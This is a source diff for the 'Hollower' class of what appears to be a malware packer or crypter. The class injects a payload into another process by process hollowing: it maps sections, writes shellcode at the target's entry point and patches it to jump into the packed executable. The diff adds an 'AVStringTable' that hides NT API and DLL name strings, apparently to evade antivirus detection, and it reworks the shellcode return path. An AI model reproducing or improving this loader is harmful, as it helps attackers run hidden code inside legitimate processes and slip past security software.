@@ -2,9 +2,10 @@
 #include "Hollower.h"
 #include "Shellcode.h"
 #include "Reflections.h"
+#include "AVStringTable.h"
+
 
 #define STATUS_CONFLICTING_ADDRESSES 0xC0000018
-
 
 Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
 {
@@ -12,11 +13,15 @@ Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
 	this->packedPEData = new PEData(unpackedExe);
 	this->hollowedPEData = new PEData(targetProcPath);
 
-	HMODULE hmNtdll = GetModuleHandle(L"ntdll");
+	
 
-	this->NtUnmapViewOfSection = (TNtUnmapViewOfSection) GetProcAddress(hmNtdll, "NtUnmapViewOfSection");
-	this->NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hmNtdll, "NtMapViewOfSection");
-	this->NtCreateSection = (TNtCreateSection)GetProcAddress(hmNtdll, "NtCreateSection");
+	AV_stringTable *AS = new AV_stringTable();
+
+	HMODULE hmNtdll = GetModuleHandle(AS->Ntdll.c_str());
+
+	this->NtUnmapViewOfSection = (TNtUnmapViewOfSection) GetProcAddress(hmNtdll, AS->NtUnmapViewOfSection.c_str());
+	this->NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hmNtdll,AS->NtMapViewOfSection.c_str());
+	this->NtCreateSection = (TNtCreateSection)GetProcAddress(hmNtdll,AS->NtCreateSection.c_str());
 	
 	this->containsStringSize = GetFunctionSize(ContainsString);
 	this->IATshellcodeSize= GetFunctionSize(IATshellcode);
@@ -24,7 +29,6 @@ Hollower::Hollower(std::wstring targetProcPath, IMAGE_DOS_HEADER *unpackedExe)
 	
 	this->remoteBase = (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase;
 }
-
 
 void Hollower::ReMapExe()
 {
@@ -91,6 +95,8 @@ size_t Hollower::SerializeIATInfo()
 
 void Hollower::WriteIATInfo(size_t IATInfoOffset)
 {
+
+	AV_stringTable *AS = new AV_stringTable();
 	int ContainsStringAddr = (int)this->localSectionBase + IATInfoOffset;
 
 	//copy ContainsString Function
@@ -98,21 +104,23 @@ void Hollower::WriteIATInfo(size_t IATInfoOffset)
 
 	int kernel32Str = ContainsStringAddr + containsStringSize + 0x20;
 	//copy string table for shellcode
-	lstrcpyW((wchar_t*)kernel32Str, L"KERNEL32.DLL");
+	lstrcpyW((wchar_t*)kernel32Str, AS->Kernel32.c_str());
 
 	int loadlibraryStr = kernel32Str + 0x20;
-	strcpy_s((char*)loadlibraryStr, sizeof("LoadLibraryA"), "LoadLibraryA");
+	strcpy_s((char*)loadlibraryStr, 13, AS->LoadLibraryA.c_str());
 
 	int getProcAddrStr = loadlibraryStr + 0x20;
-	strcpy_s((char*)getProcAddrStr, sizeof("GetProcAddress"), "GetProcAddress");
+	strcpy_s((char*)getProcAddrStr, 15, AS->GetProcAddress.c_str());
 
 	//Our Shellcode EP should be lined up to EIP of the suspended process (AddressOfEntryPoint) - avoid SetThreadContext call :)
 	int IATBootstrapEP = (int)this->localSectionBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint);
 
 	//copy IATShellcode
 	memcpy((void*)IATBootstrapEP, IATshellcode, this->IATshellcodeSize);
+
+
 	
-	//Apply settings to shellcodeEP
+	//Rewrite shellcode settinga
 	FindReplaceMemory((void*)IATBootstrapEP, 
 		(size_t)this->IATshellcodeSize, 
 		std::map<DWORD, DWORD>({
@@ -122,9 +130,16 @@ void Hollower::WriteIATInfo(size_t IATInfoOffset)
 								{ KERNEL32_PLACEHOLDER, (DWORD)this->remoteBase + (kernel32Str - (int)this->localSectionBase) },
 								{ LOADLIBRARY_PLACEHOLDER,(DWORD)this->remoteBase + (loadlibraryStr - (int)this->localSectionBase)},
 								{ GETPROCADDRESS_PLACEHOLDER,(DWORD)this->remoteBase + (getProcAddrStr - (int)this->localSectionBase)},
-								{ OEP_PLACEHOLDER, (DWORD)this->remoteBase + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() }
+								{ OEP_PLACEHOLDER, (DWORD)this->remoteBase + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() },
+								{ RET_INT3_INT3_INT3,PUSH | PUSH_PLACEHOLDER}
 								}));
+	FindReplaceMemory((void*)IATBootstrapEP,
+		(size_t)this->IATshellcodeSize,
+		std::map<DWORD, DWORD>({
+							{ PUSH_PLACEHOLDER >> 8, (DWORD)this->remoteBase + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() } //Push OEP before RET
+	}));
 
+	*(DWORD*)((int)IATBootstrapEP + (int)this->IATshellcodeSize + 1) = RET_INT3_INT3_INT3;
 }
 
 void Hollower::FixRelocations()
